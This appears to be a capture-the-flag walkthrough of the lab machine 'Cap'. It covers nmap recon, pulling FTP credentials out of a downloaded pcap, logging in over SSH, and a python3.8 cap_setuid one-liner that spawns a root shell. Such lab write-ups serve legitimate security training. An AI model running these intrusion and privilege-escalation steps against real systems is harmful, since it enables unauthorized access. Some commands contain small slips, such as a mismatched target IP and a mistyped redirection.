# Cap (Easy) 🟢
<div align="center">
</div>
<img width="256" height="256" src="Images/Cap.png">
</p>

## This machine was really easy. After completing other, more complex ones, this one felt like a gift.
The first step is the recognition phase:
```bash
nmap -sS -vvv --min-rate 5000 -Pn -p- --open -n 10.10.11.59 -oG allPorts
```
The scan reports the following:
```java
# Nmap 7.95 scan initiated Mon Dec 29 11:01:29 2025 as: /usr/lib/nmap/nmap --privileged -sS -vvv -p- --open -n -Pn --min-rate 5000 -oG allPorts 10.10.10.245
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.245 ()   Status: Up
Host: 10.10.10.245 ()   Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///   Ignored State: closed (65532)
# Nmap done at Mon Dec 29 11:01:42 2025 -- 1 IP address (1 host up) scanned in 13.24 seconds
```
Ports `21`, `22`, and `80` are open, which means that `FTP`, `SSH`, and `HTTP` services are active.

So let's learn more about these TCP ports:
```bash
nmap -sCV -p21,22,80 10.10.10.245 -oN targeted

```
The scan will reports the following:
```java
# Nmap 7.95 scan initiated Mon Dec 29 11:03:06 2025 as: /usr/lib/nmap/nmap --privileged -sCV -p21,22,80 -oN targeted 10.10.10.245
Nmap scan report for cap.htb (10.10.10.245)
Host is up (0.059s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 29 11:03:17 2025 -- 1 IP address (1 host up) scanned in 10.21 seconds
```
At first glance we can see a service to exploit with the CVE which would be `vsftpd 3.0.3` but it would be to carry out a DDoS attack which is not of interest to us.

And little else we can see by putting the following in the `Launchpad` would be that this `OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)` comes from a `Focal` machine.

#

So after all this, we'll go to the page. We can see several sections: `/ip`, `/netstat`, and `/capture`, which is the one we're interested in. We'll click on it and have to wait approximately 5 seconds for it to take the Security Snapshot. 

It will redirect us to a page with a subdirectory called `/data/(int)`. Within that int value, it will take you to a random one, and you can download it below in .pcap format. 

So, we're going to start (and finish) from the first one. We'll enter /data/0 and download the .pcap file.
<div align="center">
</div>
<img width="1920" height="1080" src="Images/Download%20the%20.pcap.png">
</p>

#

We're going to examine the 0.pcap file we just downloaded using the CLI version of Wireshark, Tshark.
So if we put this:
```bash
tshark -r /home/kali/Downloads/0.pcap
```
So we'll set more specific parameters for the capture
```bash
tshark -r /home/kali/Downloads/0.pcap -Tfields -e tcp.payload
```
```bash

32303020504f525420636f6d6d616e64207375636365737366756c2e20436f6e7369646572207573696e6720504153562e0d0a
4c4953540d0a
313530204865726520636f6d657320746865206469726563746f7279206c697374696e672e0d0a
323236204469726563746f72792073656e64204f4b2e0d0a

504f5254203139322c3136382c3139362c312c3231322c3134310d0a
32303020504f525420636f6d6d616e64207375636365737366756c2e20436f6e7369646572207573696e6720504153562e0d0a
4c495354202d616c0d0a
313530204865726520636f6d657320746865206469726563746f7279206c697374696e672e0d0a
323236204469726563746f72792073656e64204f4b2e0d0a

5459504520490d0a
32303020537769746368696e6720746f2042696e617279206d6f64652e0d0a
504f5254203139322c3136382c3139362c312c3231322c3134330d0a
32303020504f525420636f6d6d616e64207375636365737366756c2e20436f6e7369646572207573696e6720504153562e0d0a
52455452206e6f7465732e7478740d0a
353530204661696c656420746f206f70656e2066696c652e0d0a

515549540d0a
32323120476f6f646279652e0d0a
```


#### We'll be able to see the information, but in hash form. So let's translate it into human language.
```bash
tshark -r /home/kali/Downloads/0.pcap -Tfields -e tcp.payload | xxd -ps -r
```
We will use `xxd with the parameters -ps and -r` which serve the following purpose:

- (-ps) (Plain Hexdump): Outputs the file's data in a continuous hex string without any extra formatting.
- (-r) (Revert): It performs the reverse operation, converting a hex dump back into its original binary format.

It will show us the following plain text (I'll just include the important part):

```html

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
220 (vsFTPd 3.0.3)
USER nathan                          < - - - - - - - - -  (User)
331 Please specify the password.
PASS Buck3tH4TF0RM3!                 < - - - - - - - - -  (Password)
230 Login successful.
SYST
215 UNIX Type: L8
PORT 192,168,196,1,212,140
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
PORT 192,168,196,1,212,141
200 PORT command successful. Consider using PASV.
LIST -al
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,196,1,212,143
200 PORT command successful. Consider using PASV.
RETR notes.txt
550 Failed to open file.
QUIT
221 Goodbye.
```

> User: Nathan

> Password: Buck3tH4TF0RM3! 

## User Flag:

So now, with this information, we're going to do either an SSH or an FTP connection. I prefer SSH because the SSH shell is more stable than FTP.

```bash
ssh nathan@10.10.10.245
```
This will give us the user flag in the `/home/nathan/` directory.

## Root Flag:


Let's do a: 
`getcap -r / 2</dev/null/`
It will show us the following:
```bash

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Now, to escalate privileges, we just need to enter a console command that will make us root. Knowing that we did `getcap -r / 2</dev/null/`, and that the path tells us about the cap_setuid, we need to add a command that will allow us to escalate privileges.
```bash

python3.8 -c 'import os; os.setuid(0); os.system("bash")'
```

Entering this command will grant us root privileges. In `setuid`, a value of 0 signifies being the administrator or superuser.

The `bash` command is used to switch the user from Nathan to root. Now you can have the root flag in /root.
